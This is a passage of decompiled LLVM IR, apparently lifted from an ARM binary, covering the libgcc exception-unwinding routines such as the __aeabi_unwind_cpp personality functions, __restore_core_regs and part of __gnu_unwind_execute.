  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 149, 28, 29, 30, 31, 32, 33, 34, 35, 148, 36, 37, 38, 40, 39, 42, 41, 43, 44, 2, 45, 0, 3, 46, 47, 49, 48, 1, 52, 50, 51, 53, 58, 54, 59, 55, 60, 56, 57, 61, 62, 63, 64, 66, 67, 65, 147, 69, 68, 72, 73, 74, 70, 71, 77, 75, 78, 76, 79, 80, 81, 82, 83, 85, 86, 84, 87, 89, 88, 92, 93, 94, 90, 91, 95, 96, 98, 99, 100, 97, 101, 102, 104, 103, 106, 105, 107, 108, 110, 109, 112, 111, 114, 115, 113, 116, 117, 124, 118, 125, 119, 126, 120, 127, 121, 128, 122, 123, 130, 129, 131, 132, 133, 134, 139, 135, 140, 136, 141, 137, 138, 143, 142, 144, 145, 146 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_22244.363 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19138, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19054, { 1, 0 }
  uselistorder label %dec_label_pc_1901c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18fe0, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_18f5c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_18e9c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18e98, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18df8, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18d54, { 1, 0 }
  uselistorder label %dec_label_pc_18d54.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18d54.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_191f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_191f4:
  %v0_191f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_191f4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_191f4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_191f4, %bb
  %v10_191fc = phi i32 [ %arg1, %dec_label_pc_191f4 ], [ 0, %bb ]
  ret i32 %v10_191fc

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 26, 27, 28, 44, 22, 25, 45, 46, 47, 48, 49, 5, 4, 50, 40, 41, 29, 30, 23, 33, 32, 31, 34, 6, 8, 7, 20, 43, 42, 24, 19, 36, 12, 37, 21, 11, 10, 9, 13, 14, 15, 16, 17, 18, 39, 35, 38, 51, 52 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 38, 14, 15, 16, 34, 35, 36, 37, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19204 = load i32, i32* @r1, align 4
  %v2_19204 = load i32, i32* @r2, align 4
  %v4_19204 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_19204, i32 %v2_19204, i32 2)
  ret i32 %v4_19204
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1920c = load i32, i32* @r1, align 4
  %v2_1920c = load i32, i32* @r2, align 4
  %v4_1920c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_1920c, i32 %v2_1920c, i32 1)
  ret i32 %v4_1920c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19214 = load i32, i32* @r1, align 4
  %v2_19214 = load i32, i32* @r2, align 4
  %v4_19214 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_19214, i32 %v2_19214, i32 0)
  ret i32 %v4_19214

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 12, 11, 10, 61, 13, 0, 22, 14, 23, 62, 63, 64, 18, 19, 20, 21, 43, 44, 45, 46, 65, 66, 67, 81, 82, 83, 84, 1, 70, 71, 2, 72, 73, 3, 74, 68, 69, 37, 38, 4, 5, 6, 59, 60, 7, 8, 47, 48, 49, 75, 76, 77, 78, 79, 80, 39, 40, 41, 50, 51, 52, 54, 26, 15, 16, 17, 29, 30, 27, 28, 24, 25, 31, 32, 33, 34, 35, 36, 42, 9, 53, 55, 56, 57, 58 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1921c = add i32 %tmp, 56
  %v4_1921c = inttoptr i32 %v3_1921c to i32*
  %v5_1921c = load i32, i32* %v4_1921c, align 4
  %v6_1921c = add i32 %tmp, 60
  %v7_1921c = inttoptr i32 %v6_1921c to i32*
  %v8_1921c = load i32, i32* %v7_1921c, align 4
  %v2_19228 = load i32, i32* %arg1, align 4
  %v3_19228 = add i32 %tmp, 4
  %v4_19228 = inttoptr i32 %v3_19228 to i32*
  %v5_19228 = load i32, i32* %v4_19228, align 4
  store i32 %v5_19228, i32* @r1, align 4
  %v12_19228 = add i32 %tmp, 16
  %v13_19228 = inttoptr i32 %v12_19228 to i32*
  %v14_19228 = load i32, i32* %v13_19228, align 4
  store i32 %v14_19228, i32* @r4, align 4
  %v15_19228 = add i32 %tmp, 20
  %v16_19228 = inttoptr i32 %v15_19228 to i32*
  %v17_19228 = load i32, i32* %v16_19228, align 4
  store i32 %v17_19228, i32* @r5, align 4
  %v18_19228 = add i32 %tmp, 24
  %v19_19228 = inttoptr i32 %v18_19228 to i32*
  %v20_19228 = load i32, i32* %v19_19228, align 4
  store i32 %v20_19228, i32* @r6, align 4
  %v21_19228 = add i32 %tmp, 28
  %v22_19228 = inttoptr i32 %v21_19228 to i32*
  %v23_19228 = load i32, i32* %v22_19228, align 4
  store i32 %v23_19228, i32* @r7, align 4
  %v24_19228 = add i32 %tmp, 32
  %v25_19228 = inttoptr i32 %v24_19228 to i32*
  %v26_19228 = load i32, i32* %v25_19228, align 4
  store i32 %v26_19228, i32* @r8, align 4
  %v27_19228 = add i32 %tmp, 36
  %v28_19228 = inttoptr i32 %v27_19228 to i32*
  %v29_19228 = load i32, i32* %v28_19228, align 4
  store i32 %v29_19228, i32* @sb, align 4
  %v30_19228 = add i32 %tmp, 40
  %v31_19228 = inttoptr i32 %v30_19228 to i32*
  %v32_19228 = load i32, i32* %v31_19228, align 4
  store i32 %v32_19228, i32* @sl, align 4
  store i32 %v8_1921c, i32* @ip, align 4
  store i32 %v5_1921c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_1921c)
  ret i32 %v2_19228

; uselistorder directives
  uselistorder i32 %v8_1921c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 43, 44, 45, 46, 13, 14, 5, 0, 49, 6, 7, 47, 48, 11, 12, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 1, 83, 84, 85, 86, 87, 88, 89, 90, 91, 8, 92, 93, 35, 36, 2, 37, 38, 39, 40, 41, 42, 33, 17, 34, 9, 20, 10, 15, 16, 27, 28, 29, 30, 31, 32, 21, 22, 23, 24, 25, 26, 3, 18, 19, 4 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 15, 10, 16, 17, 18, 5, 19, 20, 0, 21, 23, 22, 24, 1, 25, 27, 26 }
  uselistorder i32* @sb, { 117, 118, 119, 7, 8, 9, 10, 99, 100, 101, 102, 103, 104, 105, 106, 107, 110, 108, 109, 111, 1, 91, 92, 74, 75, 18, 19, 20, 21, 22, 23, 24, 25, 2, 3, 4, 5, 6, 30, 31, 26, 27, 28, 29, 11, 12, 13, 14, 15, 16, 17, 32, 0, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 93, 94, 95, 96, 97, 98, 112, 113, 114, 115, 116 }
  uselistorder i32 36, { 21, 20, 4, 22, 6, 7, 5, 16, 19, 8, 17, 9, 0, 1, 2, 3, 10, 11, 18, 12, 13, 14, 15 }
  uselistorder i32* @r8, { 282, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 2, 281, 0, 47, 283, 13, 284, 48, 49, 50, 51, 34, 35, 36, 37, 38, 39, 40, 41, 42, 4, 43, 44, 45, 46, 52, 53, 54, 55, 14, 285, 15, 31, 32, 5, 33, 217, 218, 6, 219, 220, 221, 245, 246, 247, 248, 249, 11, 250, 251, 252, 253, 254, 255, 256, 257, 204, 205, 206, 207, 189, 190, 191, 192, 193, 168, 169, 170, 171, 61, 62, 63, 64, 16, 17, 18, 105, 106, 107, 108, 109, 65, 66, 67, 68, 110, 111, 112, 113, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 19, 30, 79, 80, 81, 82, 7, 56, 1, 57, 58, 59, 12, 60, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 98, 95, 96, 97, 101, 99, 100, 10, 102, 103, 104, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 8, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 194, 195, 196, 197, 198, 199, 9, 200, 201, 202, 203, 208, 209, 3, 210, 211, 212, 213, 214, 215, 216, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 258, 259, 260, 261, 262, 263 }
  uselistorder i32 32, { 93, 90, 91, 92, 52, 94, 95, 48, 63, 96, 47, 87, 53, 49, 72, 70, 71, 67, 68, 69, 79, 80, 73, 74, 65, 66, 77, 78, 54, 85, 86, 88, 2, 3, 5, 4, 89, 7, 6, 9, 8, 11, 10, 12, 50, 55, 51, 81, 56, 14, 13, 60, 57, 58, 59, 16, 15, 18, 17, 20, 19, 64, 22, 21, 24, 23, 25, 27, 26, 29, 28, 30, 31, 33, 32, 75, 76, 82, 34, 83, 35, 84, 36, 37, 38, 39, 61, 40, 41, 42, 62, 43, 0, 44, 1, 45, 46 }
  uselistorder i32 28, { 45, 10, 28, 46, 25, 47, 48, 49, 50, 7, 29, 30, 26, 27, 34, 11, 31, 12, 42, 43, 44, 8, 13, 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 9, 17, 33, 32, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 24, { 96, 95, 97, 8, 9, 98, 0, 58, 59, 60, 61, 62, 63, 56, 57, 10, 64, 65, 75, 76, 66, 67, 7, 11, 94, 89, 90, 91, 1, 77, 78, 79, 38, 39, 12, 68, 69, 70, 49, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 55, 71, 72, 73, 74, 13, 14, 15, 16, 17, 18, 19, 20, 21, 80, 22, 23, 2, 24, 25, 26, 3, 27, 28, 4, 29, 30, 81, 31, 5, 82, 32, 83, 84, 85, 86, 33, 34, 6, 87, 35, 88, 36, 92, 37, 93 }
  uselistorder i32 20, { 127, 125, 126, 128, 1, 4, 8, 35, 129, 31, 130, 131, 132, 133, 5, 134, 135, 2, 136, 36, 9, 32, 33, 34, 37, 38, 39, 49, 50, 40, 41, 137, 118, 119, 120, 121, 122, 123, 124, 10, 114, 115, 116, 3, 51, 11, 52, 53, 0, 30, 43, 12, 45, 13, 46, 29, 44, 42, 47, 48, 14, 15, 16, 17, 54, 18, 55, 56, 57, 58, 59, 60, 19, 61, 62, 63, 64, 65, 66, 20, 67, 68, 69, 70, 71, 72, 73, 74, 75, 21, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 85, 86, 87, 88, 89, 23, 90, 91, 24, 92, 93, 94, 95, 25, 96, 97, 26, 98, 99, 100, 101, 102, 103, 104, 6, 105, 27, 106, 107, 108, 109, 7, 110, 28, 111, 112, 113, 117 }
  uselistorder i32* @r1, { 185, 20, 19, 18, 4, 186, 187, 65, 66, 82, 45, 2, 189, 46, 188, 168, 47, 48, 49, 21, 67, 1, 68, 69, 22, 192, 23, 5, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 6, 210, 211, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 71, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 3, 81, 24, 175, 119, 120, 212, 25, 214, 215, 216, 217, 131, 132, 31, 93, 32, 213, 26, 33, 176, 177, 178, 179, 180, 181, 182, 183, 184, 44, 111, 112, 170, 7, 166, 167, 8, 171, 174, 172, 9, 173, 94, 95, 27, 158, 153, 96, 159, 169, 133, 134, 12, 34, 35, 36, 37, 38, 39, 40, 10, 220, 221, 222, 223, 0, 224, 30, 83, 121, 154, 97, 218, 219, 190, 191, 28, 13, 98, 122, 123, 124, 125, 126, 29, 135, 136, 99, 100, 41, 42, 43, 101, 102, 103, 105, 106, 104, 84, 85, 87, 89, 86, 14, 88, 15, 90, 91, 92, 137, 107, 108, 109, 110, 113, 114, 115, 16, 116, 117, 118, 127, 128, 129, 17, 130, 162, 163, 11, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 155, 156, 157, 160, 161, 164, 165 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 4, 32, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 10, 9, 3, 11, 12, 13, 14, 15, 29, 30, 26, 27, 5, 6, 2, 7, 1, 8, 28, 0, 31 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19238 = load i32, i32* @r0, align 4
  ret i32 %v1_19238
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19240 = load i32, i32* @r0, align 4
  ret i32 %v1_19240
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19254 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19258 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_19254, i32 0)
  ret i32 %v2_19258

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19278 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1927c = call i32 @__gnu_Unwind_Resume(i32 %v2_19278, i32 0)
  ret i32 %v2_1927c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1929c = ptrtoint i32* %stack_var_-68 to i32
  %v2_192a0 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_1929c, i32 0)
  ret i32 %v2_192a0

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_192c0 = ptrtoint i32* %stack_var_-68 to i32
  %v6_192c4 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_192c0, i32 %arg2, i8* %arg3, i32 %v2_192c0)
  ret i32 %v6_192c4

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_192f0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_192f8 = add i32 %tmp1, 76
  %v2_192f8 = inttoptr i32 %v1_192f8 to i32*
  %v3_192f8 = load i32, i32* %v2_192f8, align 4
  %v1_192fc = add i32 %v3_192f8, 7
  %v2_192fc = inttoptr i32 %v1_192fc to i8*
  %v3_192fc = load i8, i8* %v2_192fc, align 1
  %v4_192fc = zext i8 %v3_192fc to i32
  %v1_19300 = add i32 %v3_192f8, 8
  %v3_19304 = mul nuw nsw i32 %v4_192fc, 4
  %v2_19308 = add i32 %v3_19304, %v1_19300
  %v3_19308 = inttoptr i32 %v2_19308 to i8*
  ret i8* %v3_19308
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_19318 = load i32, i32* @r6, align 4
  %v21_19318 = load i32, i32* @lr, align 4
  %v0_1931c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1931c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_1932c

dec_label_pc_1932c:                               ; preds = %dec_label_pc_1932c.backedge, %entry
  %v3_19338 = phi i32 [ %v0_1932c.pre, %dec_label_pc_1932c.backedge ], [ %tmp, %entry ]
  %v1_1932c = add i32 %v3_19338, 8
  %v2_1932c = inttoptr i32 %v1_1932c to i8*
  %v3_1932c = load i8, i8* %v2_1932c, align 1
  %v4_1932c = zext i8 %v3_1932c to i32
  store i32 %v4_1932c, i32* %r3.global-to-local, align 4
  %v2_19330 = icmp eq i8 %v3_1932c, 0
  store i1 %v2_19330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19330, label %dec_label_pc_19340, label %.thread

.thread:                                          ; preds = %dec_label_pc_1932c
  %v2_19334 = add nsw i32 %v4_1932c, -1
  store i32 %v2_19334, i32* %r3.global-to-local, align 4
  %v2_19338 = trunc i32 %v2_19334 to i8
  store i8 %v2_19338, i8* %v2_1932c, align 1
  %v0_1933c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1933c.pr.pr, label %.thread.dec_label_pc_19340_crit_edge, label %dec_label_pc_19368

.thread.dec_label_pc_19340_crit_edge:             ; preds = %.thread
  %v0_19340.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19340

dec_label_pc_19340:                               ; preds = %.thread.dec_label_pc_19340_crit_edge, %dec_label_pc_1932c
  %v0_19340 = phi i32 [ %v0_19340.pre, %.thread.dec_label_pc_19340_crit_edge ], [ %v3_19338, %dec_label_pc_1932c ]
  %v1_19340 = add i32 %v0_19340, 9
  %v2_19340 = inttoptr i32 %v1_19340 to i8*
  %v3_19340 = load i8, i8* %v2_19340, align 1
  %v4_19340 = zext i8 %v3_19340 to i32
  store i32 %v4_19340, i32* %r3.global-to-local, align 4
  %v2_19344 = icmp eq i8 %v3_19340, 0
  store i1 %v2_19344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19344, label %dec_label_pc_19448, label %dec_label_pc_1934c

dec_label_pc_1934c:                               ; preds = %dec_label_pc_1943c, %dec_label_pc_19340
  %v2_19350 = phi i32 [ %v0_1943c, %dec_label_pc_1943c ], [ %v0_19340, %dec_label_pc_19340 ]
  %v0_1934c = phi i32 [ %v4_1943c, %dec_label_pc_1943c ], [ %v4_19340, %dec_label_pc_19340 ]
  %v1_1934c = add nsw i32 %v0_1934c, -1
  store i32 %v1_1934c, i32* %r3.global-to-local, align 4
  %v1_19350 = trunc i32 %v1_1934c to i8
  %v3_19350 = add i32 %v2_19350, 9
  %v4_19350 = inttoptr i32 %v3_19350 to i8*
  store i8 %v1_19350, i8* %v4_19350, align 1
  %v0_19354 = load i32, i32* @r5, align 4
  %v1_19354 = add i32 %v0_19354, 4
  %v2_19354 = inttoptr i32 %v1_19354 to i32*
  %v3_19354 = load i32, i32* %v2_19354, align 4
  store i32 %v3_19354, i32* %r2.global-to-local, align 4
  %v1_19358 = inttoptr i32 %v3_19354 to i32*
  %v2_19358 = load i32, i32* %v1_19358, align 4
  store i32 %v2_19358, i32* %r0.global-to-local, align 4
  %v4_19358 = add i32 %v3_19354, 4
  store i32 %v4_19358, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19360 = inttoptr i32 %v0_19354 to i32*
  store i32 %v2_19358, i32* %v1_19360, align 4
  %v5_19360 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19360, i32* %v2_19354, align 4
  %v0_19364 = load i32, i32* %r3.global-to-local, align 4
  %v1_19364 = trunc i32 %v0_19364 to i8
  %v2_19364 = load i32, i32* @r5, align 4
  %v3_19364 = add i32 %v2_19364, 8
  %v4_19364 = inttoptr i32 %v3_19364 to i8*
  store i8 %v1_19364, i8* %v4_19364, align 1
  br label %dec_label_pc_19368

dec_label_pc_19368:                               ; preds = %.thread, %dec_label_pc_1934c, %.thread6
  %v0_19368 = load i32, i32* @r5, align 4
  %v1_19368 = inttoptr i32 %v0_19368 to i32*
  %v2_19368 = load i32, i32* %v1_19368, align 4
  %v3_1936c = udiv i32 %v2_19368, 16777216
  store i32 %v3_1936c, i32* @r4, align 4
  store i32 %v3_1936c, i32* %ip.global-to-local, align 4
  %v3_19374 = mul i32 %v2_19368, 256
  store i32 %v3_19374, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_19368, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_19374, i32* %v1_19368, align 4
  br i1 %tmp183, label %dec_label_pc_19448, label %dec_label_pc_19384

dec_label_pc_19384:                               ; preds = %dec_label_pc_19368
  %v0_19384 = load i32, i32* @r4, align 4
  %v1_19384 = and i32 %v0_19384, 128
  store i32 %v1_19384, i32* %r1.global-to-local, align 4
  %v2_19384 = icmp eq i32 %v1_19384, 0
  store i1 %v2_19384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19384, label %dec_label_pc_19460, label %dec_label_pc_1938c

dec_label_pc_1938c:                               ; preds = %dec_label_pc_19384
  %v1_1938c = and i32 %v0_19384, 240
  store i32 %v1_1938c, i32* @r6, align 4
  %v7_19390 = icmp eq i32 %v1_1938c, 128
  store i1 %v7_19390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19390, label %dec_label_pc_19398, label %dec_label_pc_194bc

dec_label_pc_19398:                               ; preds = %dec_label_pc_1938c
  %v0_19398 = load i32, i32* @r5, align 4
  %v1_19398 = add i32 %v0_19398, 8
  %v2_19398 = inttoptr i32 %v1_19398 to i8*
  %v3_19398 = load i8, i8* %v2_19398, align 1
  %v4_19398 = zext i8 %v3_19398 to i32
  store i32 %v4_19398, i32* %r3.global-to-local, align 4
  %v2_1939c = icmp eq i8 %v3_19398, 0
  store i1 %v2_1939c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1939c, label %dec_label_pc_193ac, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19398
  %v2_193a0 = add nsw i32 %v4_19398, -1
  store i32 %v2_193a0, i32* %r3.global-to-local, align 4
  %v2_193a4 = trunc i32 %v2_193a0 to i8
  store i8 %v2_193a4, i8* %v2_19398, align 1
  %v0_193a8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_193a8.pr.pr, label %.thread3.dec_label_pc_193ac_crit_edge, label %dec_label_pc_193dc

.thread3.dec_label_pc_193ac_crit_edge:            ; preds = %.thread3
  %v0_193ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_193ac

dec_label_pc_193ac:                               ; preds = %.thread3.dec_label_pc_193ac_crit_edge, %dec_label_pc_19398
  %v2_193c0 = phi i32 [ %v0_193ac.pre, %.thread3.dec_label_pc_193ac_crit_edge ], [ %v0_19398, %dec_label_pc_19398 ]
  %v1_193ac = add i32 %v2_193c0, 9
  %v2_193ac = inttoptr i32 %v1_193ac to i8*
  %v3_193ac = load i8, i8* %v2_193ac, align 1
  %v4_193ac = zext i8 %v3_193ac to i32
  store i32 %v4_193ac, i32* %r3.global-to-local, align 4
  %v2_193b0 = icmp eq i8 %v3_193ac, 0
  store i1 %v2_193b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193b0, label %dec_label_pc_193ec, label %dec_label_pc_193bc

dec_label_pc_193bc:                               ; preds = %dec_label_pc_193ac
  %v1_193bc = add nsw i32 %v4_193ac, -1
  store i32 %v1_193bc, i32* %r3.global-to-local, align 4
  %v1_193c0 = trunc i32 %v1_193bc to i8
  store i8 %v1_193c0, i8* %v2_193ac, align 1
  %v0_193c4 = load i32, i32* @r5, align 4
  %v1_193c4 = add i32 %v0_193c4, 4
  %v2_193c4 = inttoptr i32 %v1_193c4 to i32*
  %v3_193c4 = load i32, i32* %v2_193c4, align 4
  store i32 %v3_193c4, i32* %r2.global-to-local, align 4
  %v1_193c8 = inttoptr i32 %v3_193c4 to i32*
  %v2_193c8 = load i32, i32* %v1_193c8, align 4
  store i32 %v2_193c8, i32* %r0.global-to-local, align 4
  %v4_193c8 = add i32 %v3_193c4, 4
  store i32 %v4_193c8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_193c8, i32* %v2_193c4, align 4
  %v0_193d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_193d4 = trunc i32 %v0_193d4 to i8
  %v2_193d4 = load i32, i32* @r5, align 4
  %v3_193d4 = add i32 %v2_193d4, 8
  %v4_193d4 = inttoptr i32 %v3_193d4 to i8*
  store i8 %v1_193d4, i8* %v4_193d4, align 1
  %v0_193d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_193d8 = load i32, i32* @r5, align 4
  %v2_193d8 = inttoptr i32 %v1_193d8 to i32*
  store i32 %v0_193d8, i32* %v2_193d8, align 4
  br label %dec_label_pc_193dc

dec_label_pc_193dc:                               ; preds = %.thread3, %dec_label_pc_193bc
  %v0_193dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_193dc, i32* %r3.global-to-local, align 4
  %v3_193e0 = mul i32 %v0_193dc, 256
  store i32 %v3_193e0, i32* %r0.global-to-local, align 4
  %v1_193e4 = load i32, i32* @r5, align 4
  %v2_193e4 = inttoptr i32 %v1_193e4 to i32*
  store i32 %v3_193e0, i32* %v2_193e4, align 4
